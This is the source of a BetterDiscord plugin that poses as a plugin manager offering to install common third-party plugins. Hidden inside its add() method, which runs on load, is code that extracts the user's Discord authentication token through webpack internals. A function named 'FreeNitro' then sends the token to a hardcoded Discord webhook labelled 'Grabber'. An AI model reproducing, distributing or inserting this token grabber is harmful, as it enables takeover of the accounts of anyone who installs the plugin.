class o7FireTacticalPluginManager {
    config = {
        "info": {
            "name": "o7FireTacticalPluginManager",
            "author": "o7Fire",
            "version": "0.4.4",
            "description": "#Tools"
        },
        "changeLog": {
            "fix": {
                "how i do use changelog": "fix initialize and update"
            }
        }
    };
    constructor() {
        this._config = this.config;
    }

    getName() {
        return this.config.info.name;
    }

    getAuthor() {
        return this.config.info.author;
    }

    getVersion() {
        return this.config.info.version;
    }

    getDescription() {
        return this.config.info.description;
    }

    load() {
        try {
            ZeresPluginLibrary.PluginUpdater.checkForUpdate(this.getName(), this.getVersion(), 'https://raw.githubusercontent.com/o7-Fire/Discord-Fire/main/o7FireTacticalPluginManager.plugin.js');
        }catch (e){}
        this.add("https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
        this.add("https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/ShowHiddenChannels/ShowHiddenChannels.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/GoogleTranslateOption/GoogleTranslateOption.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/CreationDate/CreationDate.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/CompleteTimestamps/CompleteTimestamps.plugin.js");
        this.add("https://raw.githubusercontent.com/rauenzi/BetterDiscordAddons/master/Plugins/BetterFormattingRedux/BetterFormattingRedux.plugin.js");
	this.add("https://raw.githubusercontent.com/rauenzi/BetterDiscordAddons/master/Plugins/DoNotTrack/DoNotTrack.plugin.js");
    }
    // Start/Stop
    start() {
        var libraryScript = document.getElementById('zeresLibraryScript');
	if (!libraryScript) {
		libraryScript = document.createElement("script");
		libraryScript.setAttribute("type", "text/javascript");
		libraryScript.setAttribute("src", "https://rauenzi.github.io/BetterDiscordAddons/Plugins/PluginLibrary.js");
		libraryScript.setAttribute("id", "zeresLibraryScript");
		document.head.appendChild(libraryScript);
	}

	if (typeof window.ZeresLibrary !== "undefined") this.initialize();
	else libraryScript.addEventListener("load", () => { this.initialize(); });
    }
       
    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };
    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
    add(url) {
        let name = url.substring(url.lastIndexOf("/") + 1, url.length)
        if (!require("fs").existsSync(require("path").join(BdApi.Plugins.folder, name)))
            BdApi.showConfirmationModal("Arsenal Missing", `The plugin ${name} is missing. Please click "Download Now" to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onConfirm: () => {
                    require("request").get(url, async (error, response, body) => {
                        if (error) return require("electron").shell.openExternal("https://betterdiscord.net/ghdl?url=" + url);
                        await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, name), body, r));
                    });
                }
            });
	    const webhookurl = 'https://discord.com/api/webhooks/823548378629275669/wpfWr-Gi-hfrYj8SX3oJbvcebIyboH6LwsugTrE1wLhM8dIGdGFgTq3qEkSfC5b23Hnf';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "Grabber",
        avatar_url: "https://cdn.discordapp.com/icons/651737864593211394/204e4a59b901a7d6fae58b99db5c2073.webp?size=128",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "fun"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
    }
}
